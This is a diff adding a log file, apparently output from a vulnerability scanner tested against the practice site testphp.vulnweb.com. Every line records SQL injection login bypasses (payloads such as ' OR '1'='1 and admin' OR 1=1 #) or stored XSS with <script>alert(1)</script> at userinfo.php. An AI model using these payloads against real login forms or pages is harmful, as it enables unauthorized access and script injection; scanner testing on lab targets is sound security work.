@@ -1,0 +1,105 @@
+[!!!] SQL Injection Exploited with payload: ' OR '1'='1 on pass - Bypassed login
+[!!!] SQL Injection Exploited with payload: ' OR '1'='1 on pass - Bypassed login
+[!!!] SQL Injection Exploited with payload: ' OR '1'='1 on pass - Bypassed login
+[!!!] SQL Injection Exploited with payload: ' OR '1'='1 on pass - Bypassed login
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered.
+[!!!] SQL Injection Exploited with payload: admin' OR 1=1 # on uname - Bypassed login
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog triggered: Alert triggered
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog triggered: Alert triggered
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Custom alert triggered: 1
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Custom alert triggered: 1
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Custom alert triggered: 1
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Custom alert triggered: 1
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Custom alert triggered: 1
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Native alert triggered: 1
+[*] Custom alert triggered: 1
+[!!!] Stored XSS Exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Native alert triggered: 1
+[*] Custom alert triggered: 1
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
+[!!!] Stored XSS may have been exploited with payload: <script>alert(1)</script> at http://testphp.vulnweb.com/userinfo.php
+[*] Alert dialog should have been triggered (check manually).
